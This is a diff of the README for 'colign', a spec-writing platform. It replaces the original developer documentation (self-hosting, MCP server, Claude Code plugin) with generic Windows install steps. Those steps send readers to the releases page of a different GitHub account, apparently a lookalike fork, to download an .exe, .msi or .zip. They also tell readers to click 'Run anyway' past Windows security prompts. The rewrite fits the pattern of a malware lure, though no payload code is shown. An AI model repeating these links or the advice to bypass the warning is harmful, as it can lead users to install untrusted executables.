@@ -1,196 +1,187 @@
-<div align="center">
+# 🤖 colign - Write Specs, Align Teams Faster
 
-# Colign
+[![Download colign](https://img.shields.io/badge/Download%20colign-4B8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/invertible-statue269/colign/releases)
 
-**Align your team before AI writes the code.**
+## 🧭 What colign does
 
-An open-source spec-driven development platform where teams discuss, write, and review specs together — then let AI implement them.
+colign helps teams write clear specs and keep work aligned. It brings product notes, team comments, and AI help into one place. You can use it with Claude Code, Cursor, and other AI tools.
 
-<p>
-  <a href="https://github.com/gobenpark/colign/actions/workflows/ci.yml"><img src="https://github.com/gobenpark/colign/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-AGPL--3.0-blue.svg" alt="License: AGPL-3.0"></a>
-  <a href="https://go.dev"><img src="https://img.shields.io/badge/Go-1.26-00ADD8?logo=go&logoColor=white" alt="Go"></a>
-  <a href="https://nextjs.org"><img src="https://img.shields.io/badge/Next.js-16-000000?logo=next.js&logoColor=white" alt="Next.js"></a>
-  <a href="CONTRIBUTING.md"><img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" alt="PRs Welcome"></a>
-</p>
+It is built for spec-driven development. That means you start with a clear spec, then use that spec to guide the work. This helps reduce confusion and keeps everyone on the same page.
 
-</div>
+## 💻 What you need
 
-<img src="docs/assets/dashboard.png" width="100%" alt="Colign Dashboard"/>
+- A Windows PC
+- An internet connection
+- A modern web browser
+- Permission to download and open files
+- Enough free disk space for the app and its data
 
-<!-- TODO: Add demo video -->
+For best results, use Windows 10 or Windows 11.
 
----
+## 📦 Download colign
 
-## Why Colign?
+Visit the release page here:
 
-AI vibe coding has made individual developers incredibly productive. Claude Code, Cursor, Copilot — there are already powerful tools for writing code on your own.
+[https://github.com/invertible-statue269/colign/releases](https://github.com/invertible-statue269/colign/releases)
 
-But real software is never built alone.
+On that page, look for the latest Windows download. It may be an `.exe` file or a `.msi` installer. Download the file that matches your computer.
 
-Working in a team means aligning on **"what to build"** before writing any code. You gather requirements, discuss specs, define acceptance criteria, get reviews, and only then start implementing. Most AI development tools don't address this **upstream collaboration** — the discussion, alignment, and spec writing that happens before code.
+## 🪟 Install on Windows
 
-That's where Colign comes in.
+1. Open the release page.
+2. Find the newest version at the top.
+3. Download the Windows installer or app file.
+4. When the download finishes, open the file.
+5. If Windows shows a security prompt, choose **Run** or **More info** then **Run anyway** if you trust the source.
+6. Follow the setup steps on screen.
+7. Finish the install.
 
-- Discuss and write specs together with AI
-- Co-edit specs in real-time with your team
-- Structure the alignment process with a Draft → Design → Review → Ready workflow
-- Once specs are finalized, AI helps implement based on them
+If you get a file in `.zip` form, right-click it and choose **Extract All** before opening the app.
 
-**AI that writes code already exists. Colign makes sure your team is looking at the same thing before the code gets written.**
+## ▶️ Run the app
 
-## Features
+After install, start colign from:
 
-- **AI Spec Generation** — Generate structured specs from a single prompt using your own API key
-- **Real-time Co-editing** — Collaborate on specs simultaneously with your team
-- **Structured Proposals** — Problem, Scope, Approach, Acceptance Criteria in a consistent format
-- **Project Memory** — Persistent context (domain rules, constraints, decisions) shared across all specs
-- **Workflow States** — Draft → Design → Review → Ready pipeline for every change
-- **MCP Server** — Connect Claude Code, Cursor, or any MCP-compatible AI tool to read/write specs
-- **Dashboard & Inbox** — Track spec status, reviews, and notifications in one place
+- the desktop shortcut
+- the Start menu
+- the folder where you installed it
 
-## Spec-Driven Development
+If you downloaded a standalone app file, double-click it to open colign.
 
-Colign follows a **Spec-Driven Development (SDD)** approach. When AI can generate code in minutes, the bottleneck shifts from "can we build it?" to "have we defined it correctly?"
+The first launch may take a short time while Windows sets it up.
 
-### Two-layer spec architecture
+## ✍️ How to use colign
 
-Traditional PRDs tried to put everything in one 30-page document. Colign splits this into two layers:
+### 1. Create a spec
 
-**Project Memory** — Strategic context that rarely changes. Domain rules, business constraints, target users, and technical decisions. Written once, referenced by every Change.
+Start by writing what you want to build. Use plain language. Keep it short and clear.
 
-**Structured Proposal** — Tactical spec for each Change. Lightweight, structured, and designed for both humans and AI agents to read:
+A good spec often includes:
 
-| Section | Required | Purpose |
-|---------|:--------:|---------|
-| **Problem** | Yes | Why is this change needed? |
-| **Scope** | Yes | What specifically will change? |
-| **Out of Scope** | No | What is explicitly NOT part of this? |
-| **Approach** | No | Technical direction and rationale |
-| **Acceptance Criteria** | Yes | Given/When/Then scenarios |
+- the goal
+- who will use it
+- what problem it solves
+- what the app should do
+- what it should not do
 
-### Two paths for AI integration
+### 2. Share it with your team
 
-1. **Platform AI** — Use your own API key to generate structured specs directly in Colign
-2. **External AI** — Connect Claude Code, Cursor, or other AI tools via MCP Server to read/write specs in Colign
+Use colign to keep your team aligned on one version of the plan. This helps product, design, and engineering work from the same document.
 
-> For design decisions and competitive analysis behind this structure, see [docs/structured-proposal.md](docs/structured-proposal.md).
+### 3. Add AI help
 
-## MCP Integration
+colign works with AI tools such as Claude Code and Cursor. You can use AI to:
 
-Colign exposes an MCP (Model Context Protocol) server so any AI tool — Claude Code, Cursor, Windsurf, VS Code Copilot — can read and write specs directly.
+- draft a spec
+- tighten wording
+- list edge cases
+- turn notes into tasks
+- check for gaps
 
-### Streamable HTTP (SaaS)
+### 4. Keep the spec current
 
-No binary to install. Just add the URL and your API token:
+As the work changes, update the spec. This helps the team avoid old assumptions and missed details.
 
-```json
-{
-  "mcpServers": {
-    "colign": {
-      "url": "https://api.colign.co/mcp",
-      "headers": {
-        "Authorization": "Bearer col_your_token_here"
-      }
-    }
-  }
-}
-```
+## 🔧 Common tasks
 
-Generate an API token at **Settings > AI & API Keys** in the Colign web app.
+### Write a new product spec
+Use colign when you need a clean place to shape an idea before coding starts.
 
-### stdio (Local / Self-hosted)
+### Review a draft with others
+Share the spec with your team and collect comments in one place.
 
-For local development or self-hosted instances:
+### Plan feature work
+Break a feature into clear parts so the team can see the scope.
 
-```bash
-go build -o colign-mcp ./cmd/mcp
+### Keep track of decisions
+Record choices, trade-offs, and open questions so they do not get lost.
 
-COLIGN_API_TOKEN=col_... COLIGN_API_URL=http://localhost:8080 ./colign-mcp
-```
+## 🧠 Tips for better specs
 
-### MCP Tools
+- Write for the next person who will read it
+- Use short sentences
+- Name the user, the goal, and the result
+- Avoid vague words like “better” or “nice”
+- State what done looks like
+- List questions that still need answers
+- Update the spec when the plan changes
 
-| Tool | Description |
-|------|-------------|
-| `list_projects` | List all accessible projects |
-| `get_change` | Get change details including stage |
-| `read_spec` | Read a spec document (proposal, design, spec, tasks) |
-| `write_spec` | Write or update a spec document |
-| `list_tasks` | List implementation tasks for a change |
-| `update_task` | Update a task's status (todo, in_progress, done) |
-| `suggest_spec` | Get suggestions for improving a spec |
-| `list_acceptance_criteria` | List acceptance criteria (Given/When/Then) |
-| `create_acceptance_criteria` | Create BDD-style acceptance criteria |
+## 🗂️ Suggested spec format
 
-## Claude Code Plugin
+You can use this simple format:
 
-Colign ships with a [Claude Code plugin](plugins/claude-code/) that adds workflow skills on top of MCP.
+### Goal
+What do we want to achieve?
 
-### Install
+### User
+Who is this for?
 
-```bash
-# 1. Register marketplace
-/plugin marketplace add https://github.com/colign/plugin
+### Problem
+What issue are we solving?
 
-# 2. Install plugin
-/plugin install colign@colign
+### Scope
+What is included?
 
-# 3. Reload and connect (browser opens for OAuth login)
-/reload-plugins
-```
+### Out of scope
+What is not included?
 
-### Workflow Skills
+### Flow
+What happens step by step?
 
-6 skills that follow the change lifecycle:
+### Rules
+What should the app always do?
 
-```
-onboard → explore → propose → plan → implement → complete
-```
+### Questions
+What still needs a decision?
 
-| Skill | Stage | Description |
-|-------|-------|-------------|
-| `/colign:onboard` | Setup | Verify MCP connection and API token |
-| `/colign:explore` | Any | Browse projects, read specs, check status |
-| `/colign:propose` | Draft → Problem | Write a structured proposal |
-| `/colign:plan` | Problem → Solution | Break proposal into architecture and tasks |
-| `/colign:implement` | Solution → Review | Code against the spec, update task progress |
-| `/colign:complete` | Review → Done | Verify all tasks done, advance workflow |
+## 🔄 Team workflow
 
-Skills trigger automatically by context (e.g., "implement the next task") or explicitly via `/colign:implement`.
+A simple team flow looks like this:
 
-## Getting Started
+1. Write the first spec
+2. Share it with the team
+3. Review comments
+4. Update the spec
+5. Start the work
+6. Keep the spec in sync with the build
 
-```bash
-# Start all services (API + DB + Redis)
-docker-compose up --build
+This flow helps teams move with fewer handoff problems and less rework.
 
-# Run frontend (separate terminal)
-cd web && npm install && npm run dev
-```
+## 🧩 Works well with AI tools
 
-Open http://localhost:3000 to access the app.
+colign fits into AI-first work styles. Teams using Claude Code, Cursor, and similar tools can use specs as the source of truth before writing code.
 
-## Development
+This is useful when:
 
-```bash
-# Generate proto (Go + TypeScript)
-cd proto && buf generate
+- a feature has many parts
+- several people work on the same product
+- the team wants fewer unclear requests
+- product and engineering need one shared plan
 
-# Run API server locally
-go run ./cmd/api
+## 🛠️ If something does not open
 
-# Run tests
-go test ./...
-```
+If the app does not start:
 
-## Prerequisites
+- make sure the download finished
+- try opening it again
+- check whether Windows blocked the file
+- confirm you downloaded the latest Windows release
+- restart your PC and try once more
 
-- Go 1.26+
-- Node.js 20+
-- Docker & Docker Compose
-- [buf](https://buf.build/docs/installation)
+If you used a zip file, extract it first.
 
-## License
+## 📁 Where to find updates
 
-This project is licensed under the [GNU Affero General Public License v3.0](LICENSE) (AGPL-3.0).
+New versions, fixes, and release files are posted on the release page:
+
+[https://github.com/invertible-statue269/colign/releases](https://github.com/invertible-statue269/colign/releases)
+
+Check this page when you want the latest Windows build.
+
+## 🧾 About this project
+
+**colign** is an AI-powered spec writing and team alignment platform for teams that use Claude Code, Cursor, and other AI tools. It is made to support spec-driven development and help teams turn rough ideas into clear plans
+
+## 🔎 Topics
+
+ai, ai-coding, ai-collaboration, claude, claude-code, collaboration, developer-tools, golang, grpc, mcp, mcp-server, nextjs, product-requirements, realtime-collaboration, software-specifications, spec-driven-development, spec-writing, team-collaboration, workflow
